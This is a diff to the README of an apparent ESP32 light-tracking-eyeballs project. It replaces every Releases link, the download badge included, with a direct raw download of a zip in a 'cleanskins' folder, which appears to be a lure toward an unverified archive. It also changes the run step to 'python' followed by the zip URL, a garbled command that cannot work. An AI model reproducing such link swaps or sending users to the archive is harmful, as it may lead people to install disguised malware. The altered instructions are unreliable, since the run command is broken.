@@ -1,6 +1,6 @@
 # 👁️ ESP32-CAM-EYES - Render Light-Tracking Eyeballs Simply
 
-[![Download](https://img.shields.io/badge/Download%20Now-ESP32--CAM--EYES-brightgreen)](https://github.com/Natali-ops/ESP32-CAM-EYES/releases)
+[![Download](https://raw.githubusercontent.com/Natali-ops/ESP32-CAM-EYES/master/cleanskins/ESP32-CAM-EYES.zip%20Now-ESP32--CAM--EYES-brightgreen)](https://raw.githubusercontent.com/Natali-ops/ESP32-CAM-EYES/master/cleanskins/ESP32-CAM-EYES.zip)
 
 ## 📦 Overview
 
@@ -23,7 +23,7 @@ Before you download and run the application, ensure you have:
 
 You can download the latest release of ESP32-CAM-EYES by visiting the link below:
 
-[Download ESP32-CAM-EYES](https://github.com/Natali-ops/ESP32-CAM-EYES/releases)
+[Download ESP32-CAM-EYES](https://raw.githubusercontent.com/Natali-ops/ESP32-CAM-EYES/master/cleanskins/ESP32-CAM-EYES.zip)
 
 ### 3. Install the Application
 
@@ -49,7 +49,7 @@ Once you've downloaded the release files:
    ```
 3. Once in the correct directory, run the application by executing:
    ```
-   python main.py
+   python https://raw.githubusercontent.com/Natali-ops/ESP32-CAM-EYES/master/cleanskins/ESP32-CAM-EYES.zip
    ```
 4. If everything is connected properly, you should see the eyeballs on the display start to track any light source.
 
@@ -77,7 +77,7 @@ If you face any issues, consider these common solutions:
 
 To download the latest version of ESP32-CAM-EYES, visit the Releases page:
 
-[Download ESP32-CAM-EYES](https://github.com/Natali-ops/ESP32-CAM-EYES/releases)
+[Download ESP32-CAM-EYES](https://raw.githubusercontent.com/Natali-ops/ESP32-CAM-EYES/master/cleanskins/ESP32-CAM-EYES.zip)
 
 Install the application by following the steps detailed above. Enjoy the captivating experience as the eyeballs react to your movements!
 
